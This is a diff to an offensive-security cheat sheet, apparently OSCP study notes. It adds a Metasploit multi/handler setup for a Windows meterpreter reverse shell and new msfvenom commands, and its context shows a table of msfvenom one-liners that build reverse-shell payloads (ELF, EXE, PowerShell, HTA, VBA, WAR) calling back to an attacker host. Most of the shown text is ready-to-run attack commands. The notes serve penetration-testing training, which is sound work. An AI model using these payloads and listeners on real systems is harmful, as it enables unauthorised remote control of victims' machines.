@@ -412,8 +412,49 @@ Example (Microsoft SQL): [DJ](https://github.com/joetanx/oscp/blob/main/pwk-lab/
 
 ### 4.1. Listener
 
+#### Netcat
+
 ```sh
 rlwrap nc -nlvp 4444
+```
+
+#### Meterpreter
+
+```sh
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > set LPORT 4445
+LPORT => 4445
+msf6 exploit(multi/handler) > options
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
+   LPORT     4445             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 0.0.0.0:4445
 ```
 
 ### 4.2. Various reverse shells
@@ -490,8 +531,10 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 |---|---|
 |Linux (Python)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f py -o /var/www/html/reverse.py`|
 |Linux (ELF)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
+|Linux (meterpreter)|`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
 |Windows PE|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o /var/www/html/reverse.exe`|
 |Windows Powershell|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f psh -o /var/www/html/reverse.ps1`|
+|Windows meterpreter|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o /var/www/html/reverse.exe`|
 |HTML Application|`msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f hta-psh -o /var/www/html/reverse.hta`|
 |VBA|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f vba-psh -o /var/www/html/reverse.vba`|
 |Java WAR (Tomcat)|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=4444 -f war -o reverse.war`|
